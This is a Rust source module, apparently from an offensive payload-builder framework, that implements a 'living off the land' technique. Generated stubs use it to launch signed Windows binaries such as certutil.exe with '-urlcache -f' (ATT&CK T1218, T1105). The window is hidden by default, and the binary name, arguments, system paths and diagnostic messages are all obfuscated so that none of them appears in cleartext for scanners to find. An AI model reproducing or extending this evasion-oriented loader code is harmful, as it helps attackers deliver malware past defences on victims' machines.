//! Living off the land (control technique).
//!
//! Launches a process — a signed Microsoft binary (a LOLBin), or any command —
//! from the generated stub. A Control technique: it does not touch the payload,
//! it only orchestrates the chain. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::WindowMode;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the living-off-the-land technique.
///
/// A Control technique: it never runs the payload, it only launches the
/// configured process and relays its exit code back to the chain.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Process to launch. A bare name (no path separator) is resolved against
    /// `System32` at run time; a path is used as is.
    pub binary: String,
    /// Arguments passed to `binary`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub args: Vec<String>,
    /// Window visibility (default: hidden).
    #[serde(default)]
    pub window: WindowMode,
    /// Wait for the child and capture its exit code (default: true).
    #[serde(default = "default_wait")]
    pub wait: bool,
    /// Seconds to wait for the child (0 = no limit). On timeout the child keeps
    /// running.
    #[serde(default)]
    pub timeout_s: u64,
}

/// Default for [`Params::wait`]: wait for the child.
pub fn default_wait() -> bool {
    true
}

impl Default for Params {
    fn default() -> Self {
        Self {
            binary: String::new(),
            args: vec![],
            window: WindowMode::default(),
            wait: true,
            timeout_s: 0,
        }
    }
}

/// Static metadata for the living-off-the-land technique.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "living_off_the_land",
    attck: &["T1218", "T1105"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Control,
    doc_path: "src/techniques/living_off_the_land/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: living_off_the_land\nparams:\n  binary: certutil.exe\n  args: [\"-urlcache\", \"-f\"]\n",
    // The launcher is Win32 (`CreateProcessA`); routing it through the syscall
    // layer is out of scope (a new process is an entry point, not a kernel call
    // the stub issues).
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at run time through `strings`, so no diagnostic text lands in the
/// generated stub's `.rdata`. Messages are keyword-free (they never mention the
/// technique name).
const MESSAGES: &[(&str, &str)] = &[(
    "$MSG_LAUNCH_FAILED$",
    "could not launch the configured binary",
)];

impl Params {
    /// Renders the launcher fragment for these parameters.
    ///
    /// The binary, every argument and the launch's own fixed strings
    /// (`SystemRoot`, `System32`, the `C:\Windows` fallback) are emitted as code
    /// that rebuilds the value at run time through `strings`, so none of them
    /// lands in cleartext in the generated stub. `$FLAGS$`, `$WAIT$` and
    /// `$TIMEOUT_MS$` are plain compile-time values.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let binary = strings
            .obfuscate(&self.binary)
            .render_stub_expr("exec_binary");
        // The SystemRoot environment variable and its fallback, and the system
        // directory below it, are runtime literals, so they must be obfuscated.
        let systemroot_var = strings
            .obfuscate("SystemRoot")
            .render_stub_expr("env_systemroot");
        let windows_root = strings
            .obfuscate(r"C:\Windows")
            .render_stub_expr("windows_root");
        let system32_dir = strings
            .obfuscate("System32")
            .render_stub_expr("system32_dir");
        let args_def = if self.args.is_empty() {
            "vec![]".to_string()
        } else {
            let mut body = String::from("vec![\n");
            for (index, arg) in self.args.iter().enumerate() {
                let expr = strings
                    .obfuscate(arg)
                    .render_stub_expr(&format!("exec_arg_{index}"));
                body.push_str(&format!("            {expr},\n"));
            }
            body.push_str("        ]");
            body
        };
        let flags = match self.window {
            WindowMode::Hidden => "CREATE_NO_WINDOW",
            WindowMode::Normal => "PROCESS_CREATION_FLAGS(0)",
        };
        let timeout_ms = self.timeout_s.saturating_mul(1000).min(u32::MAX as u64);

        let mut rendered = DEF
            .stub_fragment
            .replace("$BINARY_DEF$", &binary)
            .replace("$WINDOWS_ROOT$", &windows_root)
            .replace("$ENV_SYSTEMROOT$", &systemroot_var)
            .replace("$SYSTEM32_DIR$", &system32_dir)
            .replace("$ARGS_DEF$", &args_def)
            .replace("$FLAGS$", flags)
            .replace("$WAIT$", if self.wait { "true" } else { "false" })
            .replace("$TIMEOUT_MS$", &format!("{timeout_ms}u32"));
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("exec_msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
